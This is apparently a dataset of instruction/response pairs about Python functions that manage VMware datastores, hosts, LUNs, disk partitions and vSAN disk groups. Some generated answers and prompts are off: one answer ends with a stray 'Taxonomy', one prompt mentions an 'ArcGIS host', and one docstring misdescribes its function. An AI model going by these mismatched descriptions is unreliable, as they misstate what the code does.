{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget reference to an object of specified object type and id", "response": "def get_mor_by_moid(si, obj_type, obj_moid):\n    '''\n    Get reference to an object of specified object type and id\n\n    si\n        ServiceInstance for the vSphere or ESXi server (see get_service_instance)\n\n    obj_type\n        Type of the object (vim.StoragePod, vim.Datastore, etc)\n\n    obj_moid\n        ID of the object\n    '''\n    inventory = get_inventory(si)\n    container = inventory.viewManager.CreateContainerView(inventory.rootFolder, [obj_type], True)\n    for item in container.view:\n        if item._moId == obj_moid:\n            return item\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the files from the datastore and return them as a list of vim. host. DatastoreBrowser. SearchResults objects.", "response": "def get_datastore_files(service_instance, directory, datastores, container_object, browser_spec):\n    '''\n    Get the files with a given browser specification from the datastore.\n\n    service_instance\n        The Service Instance Object from which to obtain datastores.\n\n    directory\n        The name of the directory where we would like to search\n\n    datastores\n        Name of the datastores\n\n    container_object\n        The base object for searches\n\n    browser_spec\n        BrowserSpec object which defines the search criteria\n\n    return\n        list of vim.host.DatastoreBrowser.SearchResults objects\n    '''\n\n    files = []\n    datastore_objects = get_datastores(service_instance, container_object, datastore_names=datastores)\n    for datobj in datastore_objects:\n        try:\n            task = datobj.browser.SearchDatastore_Task(datastorePath='[{}] {}'.format(datobj.name, directory),\n                                                       searchSpec=browser_spec)\n        except vim.fault.NoPermission as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(\n                'Not enough permissions. Required privilege: '\n                '{}'.format(exc.privilegeId))\n        except vim.fault.VimFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareApiError(exc.msg)\n        except vmodl.RuntimeFault as exc:\n            log.exception(exc)\n            raise salt.exceptions.VMwareRuntimeError(exc.msg)\n        try:\n            files.append(salt.utils.vmware.wait_for_task(task, directory, 'query virtual machine files'))\n        except salt.exceptions.VMwareFileNotFoundError:\n            pass\n    return files"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_datastores(service_instance, reference, datastore_names=None,\n                   backing_disk_ids=None, get_all_datastores=False):\n    '''\n    Returns a list of vim.Datastore objects representing the datastores visible\n    from a VMware object, filtered by their names, or the backing disk\n    cannonical name or scsi_addresses\n\n    service_instance\n        The Service Instance Object from which to obtain datastores.\n\n    reference\n        The VMware object from which the datastores are visible.\n\n    datastore_names\n        The list of datastore names to be retrieved. Default value is None.\n\n    backing_disk_ids\n        The list of canonical names of the disks backing the datastores\n        to be retrieved. Only supported if reference is a vim.HostSystem.\n        Default value is None\n\n    get_all_datastores\n        Specifies whether to retrieve all disks in the host.\n        Default value is False.\n    '''\n    obj_name = get_managed_object_name(reference)\n    if get_all_datastores:\n        log.trace('Retrieving all datastores visible to \\'%s\\'', obj_name)\n    else:\n        log.trace('Retrieving datastores visible to \\'%s\\': names = (%s); '\n                  'backing disk ids = (%s)',\n                  obj_name, datastore_names, backing_disk_ids)\n        if backing_disk_ids and not isinstance(reference, vim.HostSystem):\n\n            raise salt.exceptions.ArgumentValueError(\n                'Unsupported reference type \\'{0}\\' when backing disk filter '\n                'is set'.format(reference.__class__.__name__))\n    if (not get_all_datastores) and backing_disk_ids:\n        # At this point we know the reference is a vim.HostSystem\n        log.trace('Filtering datastores with backing disk ids: %s',\n                  backing_disk_ids)\n        storage_system = get_storage_system(service_instance, reference,\n                                            obj_name)\n        props = salt.utils.vmware.get_properties_of_managed_object(\n            storage_system, ['fileSystemVolumeInfo.mountInfo'])\n        mount_infos = props.get('fileSystemVolumeInfo.mountInfo', [])\n        disk_datastores = []\n        # Non vmfs volumes aren't backed by a disk\n        for vol in [i.volume for i in mount_infos if\n                    isinstance(i.volume, vim.HostVmfsVolume)]:\n\n            if not [e for e in vol.extent if e.diskName in backing_disk_ids]:\n                # Skip volume if it doesn't contain an extent with a\n                # canonical name of interest\n                continue\n            log.trace('Found datastore \\'%s\\' for disk id(s) \\'%s\\'',\n                      vol.name, [e.diskName for e in vol.extent])\n            disk_datastores.append(vol.name)\n        log.trace('Datastore found for disk filter: %s', disk_datastores)\n        if datastore_names:\n            datastore_names.extend(disk_datastores)\n        else:\n            datastore_names = disk_datastores\n\n    if (not get_all_datastores) and (not datastore_names):\n        log.trace('No datastore to be filtered after retrieving the datastores '\n                  'backed by the disk id(s) \\'%s\\'', backing_disk_ids)\n        return []\n\n    log.trace('datastore_names = %s', datastore_names)\n\n    # Use the default traversal spec\n    if isinstance(reference, vim.HostSystem):\n        # Create a different traversal spec for hosts because it looks like the\n        # default doesn't retrieve the datastores\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            name='host_datastore_traversal',\n            path='datastore',\n            skip=False,\n            type=vim.HostSystem)\n    elif isinstance(reference, vim.ClusterComputeResource):\n        # Traversal spec for clusters\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            name='cluster_datastore_traversal',\n            path='datastore',\n            skip=False,\n            type=vim.ClusterComputeResource)\n    elif isinstance(reference, vim.Datacenter):\n        # Traversal spec for datacenter\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            name='datacenter_datastore_traversal',\n            path='datastore',\n            skip=False,\n            type=vim.Datacenter)\n    elif isinstance(reference, vim.StoragePod):\n        # Traversal spec for datastore clusters\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            name='datastore_cluster_traversal',\n            path='childEntity',\n            skip=False,\n            type=vim.StoragePod)\n    elif isinstance(reference, vim.Folder) and \\\n            get_managed_object_name(reference) == 'Datacenters':\n        # Traversal of root folder (doesn't support multiple levels of Folders)\n        traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n            path='childEntity',\n            selectSet=[\n                vmodl.query.PropertyCollector.TraversalSpec(\n                    path='datastore',\n                    skip=False,\n                    type=vim.Datacenter)],\n            skip=False,\n            type=vim.Folder)\n    else:\n        raise salt.exceptions.ArgumentValueError(\n            'Unsupported reference type \\'{0}\\''\n            ''.format(reference.__class__.__name__))\n\n    items = get_mors_with_properties(service_instance,\n                                     object_type=vim.Datastore,\n                                     property_list=['name'],\n                                     container_ref=reference,\n                                     traversal_spec=traversal_spec)\n    log.trace('Retrieved %s datastores', len(items))\n    items = [i for i in items if get_all_datastores or i['name'] in\n             datastore_names]\n    log.trace('Filtered datastores: %s', [i['name'] for i in items])\n    return [i['object'] for i in items]", "response": "Returns a list of vim. Datastore objects representing the datastores visible to a service instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef rename_datastore(datastore_ref, new_datastore_name):\n    '''\n    Renames a datastore\n\n    datastore_ref\n        vim.Datastore reference to the datastore object to be changed\n\n    new_datastore_name\n        New datastore name\n    '''\n    ds_name = get_managed_object_name(datastore_ref)\n    log.trace(\"Renaming datastore '%s' to '%s'\", ds_name, new_datastore_name)\n    try:\n        datastore_ref.RenameDatastore(new_datastore_name)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)", "response": "Renames a datastore object to be changed\nTaxonomy"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn partition informations for a device path of type", "response": "def _get_partition_info(storage_system, device_path):\n    '''\n    Returns partition informations for a device path, of type\n    vim.HostDiskPartitionInfo\n    '''\n    try:\n        partition_infos = \\\n                storage_system.RetrieveDiskPartitionInfo(\n                    devicePath=[device_path])\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    log.trace('partition_info = %s', partition_infos[0])\n    return partition_infos[0]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the new computed partition spec for the given object.", "response": "def _get_new_computed_partition_spec(storage_system,\n                                     device_path,\n                                     partition_info):\n    '''\n    Computes the new disk partition info when adding a new vmfs partition that\n    uses up the remainder of the disk; returns a tuple\n    (new_partition_number, vim.HostDiskPartitionSpec\n    '''\n    log.trace('Adding a partition at the end of the disk and getting the new '\n              'computed partition spec')\n    # TODO implement support for multiple partitions\n    # We support adding a partition add the end of the disk with partitions\n    free_partitions = [p for p in partition_info.layout.partition\n                       if p.type == 'none']\n    if not free_partitions:\n        raise salt.exceptions.VMwareObjectNotFoundError(\n            'Free partition was not found on device \\'{0}\\''\n            ''.format(partition_info.deviceName))\n    free_partition = free_partitions[0]\n\n    # Create a layout object that copies the existing one\n    layout = vim.HostDiskPartitionLayout(\n        total=partition_info.layout.total,\n        partition=partition_info.layout.partition)\n    # Create a partition with the free space on the disk\n    # Change the free partition type to vmfs\n    free_partition.type = 'vmfs'\n    try:\n        computed_partition_info = storage_system.ComputeDiskPartitionInfo(\n            devicePath=device_path,\n            partitionFormat=vim.HostDiskPartitionInfoPartitionFormat.gpt,\n            layout=layout)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    log.trace('computed partition info = {0}', computed_partition_info)\n    log.trace('Retrieving new partition number')\n    partition_numbers = [p.partition for p in\n                         computed_partition_info.layout.partition\n                         if (p.start.block == free_partition.start.block or\n                             # XXX If the entire disk is free (i.e. the free\n                             # disk partition starts at block 0) the newily\n                             # created partition is created from block 1\n                             (free_partition.start.block == 0 and\n                              p.start.block == 1)) and\n                         p.end.block == free_partition.end.block and\n                         p.type == 'vmfs']\n    if not partition_numbers:\n        raise salt.exceptions.VMwareNotFoundError(\n            'New partition was not found in computed partitions of device '\n            '\\'{0}\\''.format(partition_info.deviceName))\n    log.trace('new partition number = %s', partition_numbers[0])\n    return (partition_numbers[0], computed_partition_info.spec)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_vmfs_datastore(host_ref, datastore_name, disk_ref,\n                          vmfs_major_version, storage_system=None):\n    '''\n    Creates a VMFS datastore from a disk_id\n\n    host_ref\n        vim.HostSystem object referencing a host to create the datastore on\n\n    datastore_name\n        Name of the datastore\n\n    disk_ref\n        vim.HostScsiDislk on which the datastore is created\n\n    vmfs_major_version\n        VMFS major version to use\n    '''\n    # TODO Support variable sized partitions\n    hostname = get_managed_object_name(host_ref)\n    disk_id = disk_ref.canonicalName\n    log.debug('Creating datastore \\'%s\\' on host \\'%s\\', scsi disk \\'%s\\', '\n              'vmfs v%s', datastore_name, hostname, disk_id, vmfs_major_version)\n    if not storage_system:\n        si = get_service_instance_from_managed_object(host_ref, name=hostname)\n        storage_system = get_storage_system(si, host_ref, hostname)\n\n    target_disk = disk_ref\n    partition_info = _get_partition_info(storage_system,\n                                         target_disk.devicePath)\n    log.trace('partition_info = %s', partition_info)\n    new_partition_number, partition_spec = _get_new_computed_partition_spec(\n        storage_system,\n        target_disk.devicePath,\n        partition_info\n    )\n    spec = vim.VmfsDatastoreCreateSpec(\n        vmfs=vim.HostVmfsSpec(\n            majorVersion=vmfs_major_version,\n            volumeName=datastore_name,\n            extent=vim.HostScsiDiskPartition(\n                diskName=disk_id,\n                partition=new_partition_number)),\n        diskUuid=target_disk.uuid,\n        partition=partition_spec)\n    try:\n        ds_ref = \\\n                host_ref.configManager.datastoreSystem.CreateVmfsDatastore(spec)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    log.debug('Created datastore \\'%s\\' on host \\'%s\\'', datastore_name, hostname)\n    return ds_ref", "response": "Creates a VMFS datastore from a disk and a VMFS major version."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a host s datastore system", "response": "def get_host_datastore_system(host_ref, hostname=None):\n    '''\n    Returns a host's datastore system\n\n    host_ref\n        Reference to the ESXi host\n\n    hostname\n        Name of the host. This argument is optional.\n    '''\n\n    if not hostname:\n        hostname = get_managed_object_name(host_ref)\n    service_instance = get_service_instance_from_managed_object(host_ref)\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='configManager.datastoreSystem',\n        type=vim.HostSystem,\n        skip=False)\n    objs = get_mors_with_properties(service_instance,\n                                    vim.HostDatastoreSystem,\n                                    property_list=['datastore'],\n                                    container_ref=host_ref,\n                                    traversal_spec=traversal_spec)\n    if not objs:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Host\\'s \\'{0}\\' datastore system was not retrieved'\n            ''.format(hostname))\n    log.trace('[%s] Retrieved datastore system', hostname)\n    return objs[0]['object']"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves a datastore from a service instance", "response": "def remove_datastore(service_instance, datastore_ref):\n    '''\n    Creates a VMFS datastore from a disk_id\n\n    service_instance\n        The Service Instance Object containing the datastore\n\n    datastore_ref\n        The reference to the datastore to remove\n    '''\n    ds_props = get_properties_of_managed_object(\n        datastore_ref, ['host', 'info', 'name'])\n    ds_name = ds_props['name']\n    log.debug('Removing datastore \\'%s\\'', ds_name)\n    ds_hosts = ds_props.get('host')\n    if not ds_hosts:\n        raise salt.exceptions.VMwareApiError(\n            'Datastore \\'{0}\\' can\\'t be removed. No '\n            'attached hosts found'.format(ds_name))\n    hostname = get_managed_object_name(ds_hosts[0].key)\n    host_ds_system = get_host_datastore_system(ds_hosts[0].key,\n                                               hostname=hostname)\n    try:\n        host_ds_system.RemoveDatastore(datastore_ref)\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    log.trace('[%s] Removed datastore \\'%s\\'', hostname, ds_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of vim. HostSystem objects representing ESXi hosts in a vcenter filtered by their names and cluster membership.", "response": "def get_hosts(service_instance, datacenter_name=None, host_names=None,\n              cluster_name=None, get_all_hosts=False):\n    '''\n    Returns a list of vim.HostSystem objects representing ESXi hosts\n    in a vcenter filtered by their names and/or datacenter, cluster membership.\n\n    service_instance\n        The Service Instance Object from which to obtain the hosts.\n\n    datacenter_name\n        The datacenter name. Default is None.\n\n    host_names\n        The host_names to be retrieved. Default is None.\n\n    cluster_name\n        The cluster name - used to restrict the hosts retrieved. Only used if\n        the datacenter is set.  This argument is optional.\n\n    get_all_hosts\n        Specifies whether to retrieve all hosts in the container.\n        Default value is False.\n    '''\n    properties = ['name']\n    if cluster_name and not datacenter_name:\n        raise salt.exceptions.ArgumentValueError(\n            'Must specify the datacenter when specifying the cluster')\n    if not host_names:\n        host_names = []\n    if not datacenter_name:\n        # Assume the root folder is the starting point\n        start_point = get_root_folder(service_instance)\n    else:\n        start_point = get_datacenter(service_instance, datacenter_name)\n        if cluster_name:\n            # Retrieval to test if cluster exists. Cluster existence only makes\n            # sense if the datacenter has been specified\n            properties.append('parent')\n\n    # Search for the objects\n    hosts = get_mors_with_properties(service_instance,\n                                     vim.HostSystem,\n                                     container_ref=start_point,\n                                     property_list=properties)\n    log.trace('Retrieved hosts: %s', [h['name'] for h in hosts])\n    filtered_hosts = []\n    for h in hosts:\n        # Complex conditions checking if a host should be added to the\n        # filtered list (either due to its name and/or cluster membership)\n\n        if cluster_name:\n            if not isinstance(h['parent'], vim.ClusterComputeResource):\n                continue\n            parent_name = get_managed_object_name(h['parent'])\n            if parent_name != cluster_name:\n                continue\n\n        if get_all_hosts:\n            filtered_hosts.append(h['object'])\n            continue\n\n        if h['name'] in host_names:\n            filtered_hosts.append(h['object'])\n    return filtered_hosts"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a map between the scsi addresses and the keys of all luns on an ESXi ArcGIS host.", "response": "def _get_scsi_address_to_lun_key_map(service_instance,\n                                     host_ref,\n                                     storage_system=None,\n                                     hostname=None):\n    '''\n    Returns a map between the scsi addresses and the keys of all luns on an ESXi\n    host.\n        map[<scsi_address>] = <lun key>\n\n    service_instance\n        The Service Instance Object from which to obtain the hosts\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    storage_system\n        The host's storage system. Default is None.\n\n    hostname\n        Name of the host. Default is None.\n    '''\n    if not hostname:\n        hostname = get_managed_object_name(host_ref)\n    if not storage_system:\n        storage_system = get_storage_system(service_instance, host_ref,\n                                            hostname)\n    try:\n        device_info = storage_system.storageDeviceInfo\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    if not device_info:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Host\\'s \\'{0}\\' storage device '\n            'info was not retrieved'.format(hostname))\n    multipath_info = device_info.multipathInfo\n    if not multipath_info:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Host\\'s \\'{0}\\' multipath info was not retrieved'\n            ''.format(hostname))\n    if multipath_info.lun is None:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'No luns were retrieved from host \\'{0}\\''.format(hostname))\n    lun_key_by_scsi_addr = {}\n    for l in multipath_info.lun:\n        # The vmware scsi_address may have multiple comma separated values\n        # The first one is the actual scsi address\n        lun_key_by_scsi_addr.update({p.name.split(',')[0]: l.lun\n                                     for p in l.path})\n    log.trace('Scsi address to lun id map on host \\'%s\\': %s',\n              hostname, lun_key_by_scsi_addr)\n    return lun_key_by_scsi_addr"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_all_luns(host_ref, storage_system=None, hostname=None):\n    '''\n    Returns a list of all vim.HostScsiDisk objects in a disk\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    storage_system\n        The host's storage system. Default is None.\n\n    hostname\n        Name of the host. This argument is optional.\n    '''\n    if not hostname:\n        hostname = get_managed_object_name(host_ref)\n    if not storage_system:\n        si = get_service_instance_from_managed_object(host_ref, name=hostname)\n        storage_system = get_storage_system(si, host_ref, hostname)\n        if not storage_system:\n            raise salt.exceptions.VMwareObjectRetrievalError(\n                'Host\\'s \\'{0}\\' storage system was not retrieved'\n                ''.format(hostname))\n    try:\n        device_info = storage_system.storageDeviceInfo\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    if not device_info:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Host\\'s \\'{0}\\' storage device info was not retrieved'\n            ''.format(hostname))\n\n    scsi_luns = device_info.scsiLun\n    if scsi_luns:\n        log.trace('Retrieved scsi luns in host \\'%s\\': %s',\n                  hostname, [l.canonicalName for l in scsi_luns])\n        return scsi_luns\n    log.trace('Retrieved no scsi_luns in host \\'%s\\'', hostname)\n    return []", "response": "Returns a list of all scsi luns in a disk."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_scsi_address_to_lun_map(host_ref, storage_system=None, hostname=None):\n    '''\n    Returns a map of all vim.ScsiLun objects on a ESXi host keyed by their\n    scsi address\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    storage_system\n        The host's storage system. Default is None.\n\n    hostname\n        Name of the host. This argument is optional.\n    '''\n    if not hostname:\n        hostname = get_managed_object_name(host_ref)\n    si = get_service_instance_from_managed_object(host_ref, name=hostname)\n    if not storage_system:\n        storage_system = get_storage_system(si, host_ref, hostname)\n    lun_ids_to_scsi_addr_map = \\\n        _get_scsi_address_to_lun_key_map(si, host_ref, storage_system,\n                                         hostname)\n    luns_to_key_map = {d.key: d for d in\n                       get_all_luns(host_ref, storage_system, hostname)}\n    return {scsi_addr: luns_to_key_map[lun_key] for scsi_addr, lun_key in\n            six.iteritems(lun_ids_to_scsi_addr_map)}", "response": "Returns a map of all vim. ScsiLun objects on a ESXi host keyed by their scsi address."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_disks(host_ref, disk_ids=None, scsi_addresses=None,\n              get_all_disks=False):\n    '''\n    Returns a list of vim.HostScsiDisk objects representing disks\n    in a ESXi host, filtered by their cannonical names and scsi_addresses\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    disk_ids\n        The list of canonical names of the disks to be retrieved. Default value\n        is None\n\n    scsi_addresses\n        The list of scsi addresses of the disks to be retrieved. Default value\n        is None\n\n    get_all_disks\n        Specifies whether to retrieve all disks in the host.\n        Default value is False.\n    '''\n    hostname = get_managed_object_name(host_ref)\n    if get_all_disks:\n        log.trace('Retrieving all disks in host \\'%s\\'', hostname)\n    else:\n        log.trace('Retrieving disks in host \\'%s\\': ids = (%s); scsi '\n                  'addresses = (%s)', hostname, disk_ids, scsi_addresses)\n        if not (disk_ids or scsi_addresses):\n            return []\n    si = get_service_instance_from_managed_object(host_ref, name=hostname)\n    storage_system = get_storage_system(si, host_ref, hostname)\n    disk_keys = []\n    if scsi_addresses:\n        # convert the scsi addresses to disk keys\n        lun_key_by_scsi_addr = _get_scsi_address_to_lun_key_map(si, host_ref,\n                                                                storage_system,\n                                                                hostname)\n        disk_keys = [key for scsi_addr, key\n                     in six.iteritems(lun_key_by_scsi_addr)\n                     if scsi_addr in scsi_addresses]\n        log.trace('disk_keys based on scsi_addresses = %s', disk_keys)\n\n    scsi_luns = get_all_luns(host_ref, storage_system)\n    scsi_disks = [disk for disk in scsi_luns\n                  if isinstance(disk, vim.HostScsiDisk) and (\n                      get_all_disks or\n                      # Filter by canonical name\n                      (disk_ids and (disk.canonicalName in disk_ids)) or\n                      # Filter by disk keys from scsi addresses\n                      (disk.key in disk_keys))]\n    log.trace('Retrieved disks in host \\'%s\\': %s',\n              hostname, [d.canonicalName for d in scsi_disks])\n    return scsi_disks", "response": "Returns a list of vim. HostScsiDisk objects representing the disks in a ESXi host filtered by canonical names and scsi_addresses."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_disk_partition_info(host_ref, disk_id, storage_system=None):\n    '''\n    Returns all partitions on a disk\n\n    host_ref\n        The reference of the ESXi host containing the disk\n\n    disk_id\n        The canonical name of the disk whose partitions are to be removed\n\n    storage_system\n        The ESXi host's storage system. Default is None.\n    '''\n    hostname = get_managed_object_name(host_ref)\n    service_instance = get_service_instance_from_managed_object(host_ref)\n    if not storage_system:\n        storage_system = get_storage_system(service_instance, host_ref,\n                                            hostname)\n\n    props = get_properties_of_managed_object(storage_system,\n                                             ['storageDeviceInfo.scsiLun'])\n    if not props.get('storageDeviceInfo.scsiLun'):\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'No devices were retrieved in host \\'{0}\\''.format(hostname))\n    log.trace(\n        '[%s] Retrieved %s devices: %s',\n        hostname,\n        len(props['storageDeviceInfo.scsiLun']),\n        ', '.join([l.canonicalName\n                   for l in props['storageDeviceInfo.scsiLun']])\n    )\n    disks = [l for l in props['storageDeviceInfo.scsiLun']\n             if isinstance(l, vim.HostScsiDisk) and\n             l.canonicalName == disk_id]\n    if not disks:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Disk \\'{0}\\' was not found in host \\'{1}\\''\n            ''.format(disk_id, hostname))\n    log.trace('[%s] device_path = %s', hostname, disks[0].devicePath)\n    partition_info = _get_partition_info(storage_system, disks[0].devicePath)\n    log.trace('[%s] Retrieved %s partition(s) on disk \\'%s\\'',\n              hostname, len(partition_info.spec.partition), disk_id)\n    return partition_info", "response": "Returns all partitions on a disk"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef erase_disk_partitions(service_instance, host_ref, disk_id,\n                          hostname=None, storage_system=None):\n    '''\n    Erases all partitions on a disk\n\n    in a vcenter filtered by their names and/or datacenter, cluster membership\n\n    service_instance\n        The Service Instance Object from which to obtain all information\n\n    host_ref\n        The reference of the ESXi host containing the disk\n\n    disk_id\n        The canonical name of the disk whose partitions are to be removed\n\n    hostname\n        The ESXi hostname. Default is None.\n\n    storage_system\n        The ESXi host's storage system. Default is None.\n    '''\n\n    if not hostname:\n        hostname = get_managed_object_name(host_ref)\n    if not storage_system:\n        storage_system = get_storage_system(service_instance, host_ref,\n                                            hostname)\n\n    traversal_spec = vmodl.query.PropertyCollector.TraversalSpec(\n        path='configManager.storageSystem',\n        type=vim.HostSystem,\n        skip=False)\n    results = get_mors_with_properties(service_instance,\n                                       vim.HostStorageSystem,\n                                       ['storageDeviceInfo.scsiLun'],\n                                       container_ref=host_ref,\n                                       traversal_spec=traversal_spec)\n    if not results:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Host\\'s \\'{0}\\' devices were not retrieved'.format(hostname))\n    log.trace(\n        '[%s] Retrieved %s devices: %s',\n        hostname,\n        len(results[0].get('storageDeviceInfo.scsiLun', [])),\n        ', '.join([l.canonicalName for l in\n                   results[0].get('storageDeviceInfo.scsiLun', [])])\n    )\n    disks = [l for l in results[0].get('storageDeviceInfo.scsiLun', [])\n             if isinstance(l, vim.HostScsiDisk) and\n             l.canonicalName == disk_id]\n    if not disks:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'Disk \\'{0}\\' was not found in host \\'{1}\\''\n            ''.format(disk_id, hostname))\n    log.trace('[%s] device_path = %s', hostname, disks[0].devicePath)\n    # Erase the partitions by setting an empty partition spec\n    try:\n        storage_system.UpdateDiskPartitions(disks[0].devicePath,\n                                            vim.HostDiskPartitionSpec())\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    log.trace('[%s] Erased partitions on disk \\'%s\\'', hostname, disk_id)", "response": "Erases all partitions on a disk in a vcenter filtered by their names and or datacenter"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of vim. VsanHostDiskMapping objects representing the disks in a ESXi host filtered by their cannonical names.", "response": "def get_diskgroups(host_ref, cache_disk_ids=None, get_all_disk_groups=False):\n    '''\n    Returns a list of vim.VsanHostDiskMapping objects representing disks\n    in a ESXi host, filtered by their cannonical names.\n\n    host_ref\n        The vim.HostSystem object representing the host that contains the\n        requested disks.\n\n    cache_disk_ids\n        The list of cannonical names of the cache disks to be retrieved. The\n        canonical name of the cache disk is enough to identify the disk group\n        because it is guaranteed to have one and only one cache disk.\n        Default is None.\n\n    get_all_disk_groups\n        Specifies whether to retrieve all disks groups in the host.\n        Default value is False.\n    '''\n    hostname = get_managed_object_name(host_ref)\n    if get_all_disk_groups:\n        log.trace('Retrieving all disk groups on host \\'%s\\'', hostname)\n    else:\n        log.trace('Retrieving disk groups from host \\'%s\\', with cache disk '\n                  'ids : (%s)', hostname, cache_disk_ids)\n        if not cache_disk_ids:\n            return []\n    try:\n        vsan_host_config = host_ref.config.vsanHostConfig\n    except vim.fault.NoPermission as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(\n            'Not enough permissions. Required privilege: '\n            '{0}'.format(exc.privilegeId))\n    except vim.fault.VimFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareApiError(exc.msg)\n    except vmodl.RuntimeFault as exc:\n        log.exception(exc)\n        raise salt.exceptions.VMwareRuntimeError(exc.msg)\n    if not vsan_host_config:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'No host config found on host \\'{0}\\''.format(hostname))\n    vsan_storage_info = vsan_host_config.storageInfo\n    if not vsan_storage_info:\n        raise salt.exceptions.VMwareObjectRetrievalError(\n            'No vsan storage info found on host \\'{0}\\''.format(hostname))\n    vsan_disk_mappings = vsan_storage_info.diskMapping\n    if not vsan_disk_mappings:\n        return []\n    disk_groups = [dm for dm in 